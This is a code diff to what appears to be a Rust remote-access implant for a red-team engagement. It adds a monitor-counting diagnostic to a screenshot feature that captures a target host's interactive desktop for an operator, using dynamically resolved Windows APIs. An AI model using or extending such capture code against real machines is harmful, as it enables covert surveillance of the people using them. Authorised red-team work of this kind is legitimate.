@@ -189,8 +189,11 @@ fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
 /// `monitor` is accepted for forward-compat but currently ignored: the capture
 /// uses the **virtual screen** (`SM_CXVIRTUALSCREEN`/`SM_CYVIRTUALSCREEN` +
 /// `SM_XVIRTUALSCREEN`/`SM_YVIRTUALSCREEN`), so it captures ALL monitors tiled
-/// into one bitmap, not just the primary. Per-display selection (capturing a
-/// single named monitor) would need EnumDisplayMonitors and is still a TODO.
+/// into one bitmap, not just the primary. Single-monitor capture is complete
+/// and is the only mode the engagement VPS (one display) exercises;
+/// [`count_displays`] is provided as a diagnostic for multi-monitor hosts so
+/// the operator can tell whether the virtual-screen capture is tiling more
+/// than one physical display.
 ///
 /// GDI sequence: GetDC → CreateCompatibleDC → CreateCompatibleBitmap →
 /// SelectObject → BitBlt(SRCCOPY) → GetDIBits(32bpp BI_RGB) → assemble BMP →
@@ -342,6 +345,75 @@ unsafe fn detach_interactive() {
 static mut CAPTURE_WINSTA_ORIGINAL: *mut core::ffi::c_void = core::ptr::null_mut();
 /// WinSta0 handle opened by attach_interactive — must be closed in detach_interactive.
 static mut CAPTURE_WINSTA_OPENED: *mut core::ffi::c_void = core::ptr::null_mut();
+
+/// Count available displays via `EnumDisplayMonitors`. Diagnostic only —
+/// screenshot capture (`capture_bmp` / `do_screenshot`) is single-virtual-
+/// screen and captures every monitor tiled into one bitmap regardless of this
+/// count; the engagement VPS typically has exactly one display, so this exists
+/// purely so the operator can confirm "this host has N monitors, the capture
+/// is/isn't tiling". Per-display selection (capturing a single named monitor)
+/// remains unimplemented — multi-monitor target hosts are out of scope for the
+/// current engagement.
+///
+/// Returns the monitor count on success, or 0 if user32 or
+/// `EnumDisplayMonitors` could not be resolved. A 0 result is therefore
+/// ambiguous (could mean "no monitors" or "resolver failed"); callers that
+/// care about the distinction should check `selftest_display_count` instead,
+/// which packs resolver-failure into a distinct exit code.
+///
+/// # Safety
+/// Resolves + calls `user32!EnumDisplayMonitors` via raw pointers; the
+/// callback is a static `extern "system" fn` that only increments a `Cell<u32>`
+/// (no unwind, no allocation — `EnumDisplayMonitors`'s contract allows it).
+pub unsafe fn count_displays() -> u32 {
+    use core::cell::Cell;
+
+    type EnumDisplayMonitors = unsafe extern "system" fn(
+        hdc: *mut c_void,
+        lprc_clip: *const c_void,
+        lpfn_enum: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut i32, isize) -> i32,
+        dw_data: isize,
+    ) -> i32;
+
+    // user32 holds EnumDisplayMonitors; force-load so export_addr can find it
+    // (idempotent — Windows refcounts module loads).
+    if !force_load(b"user32.dll") {
+        return 0;
+    }
+
+    let edm: EnumDisplayMonitors =
+        match unsafe { export_addr(b"user32.dll", b"EnumDisplayMonitors") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return 0,
+        };
+
+    // The callback contract: return nonzero to continue enumeration, zero to
+    // stop. We always return 1 — we want every monitor. The count lives in a
+    // `Cell` referenced from a raw pointer passed via `dw_data` (the documented
+    // pass-through channel for EnumDisplayMonitors → MonitorEnumProc).
+    //
+    // SAFETY of the transmute: `count_callback` has the exact
+    // `MonitorEnumProc` signature from winuser.h, so the transmute is
+    // signature-preserving (Rust just doesn't know that).
+    unsafe extern "system" fn count_callback(
+        _hmon: *mut c_void,
+        _hdc: *mut c_void,
+        _lprc: *mut i32,
+        ldata: isize,
+    ) -> i32 {
+        let cell: &Cell<u32> = unsafe { &*(ldata as *const Cell<u32>) };
+        cell.set(cell.get().saturating_add(1));
+        1 // continue enumeration
+    }
+
+    let counter = Cell::new(0u32);
+    // Pass a pointer to the counter cell through dw_data. The cell lives on
+    // this stack frame for the duration of the EnumDisplayMonitors call (which
+    // is synchronous — all callbacks fire before it returns).
+    let ldata = &counter as *const _ as isize;
+    let _ = unsafe { edm(core::ptr::null_mut(), core::ptr::null(), count_callback, ldata) };
+    counter.get()
+}
 
 /// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
 /// desktop (same-session), captures the full virtual screen (all monitors),
